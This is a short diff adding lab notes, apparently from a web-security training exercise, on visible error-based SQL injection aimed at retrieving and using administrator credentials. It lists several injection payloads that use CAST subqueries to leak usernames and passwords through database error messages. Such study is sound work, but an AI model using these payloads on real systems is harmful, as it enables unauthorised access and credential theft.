@@ -1,0 +1,19 @@
+Visible error-based SQL injection
+
+End Goal:
+
+1. Retrieve administrator user credentials.
+
+2. login as administrator user.
+
+Analysis:
+
+SELECT * FROM tracking WHERE id = 'RkLV4f6PWBZUt1sN'--'. Expected  char
+
+RkLV4f6PWBZUt1sN' AND CAST((SELECT 1) as int)--
+
+' AND 1=CAST((SELECT 1) as int)--
+
+' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--
+
+' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--
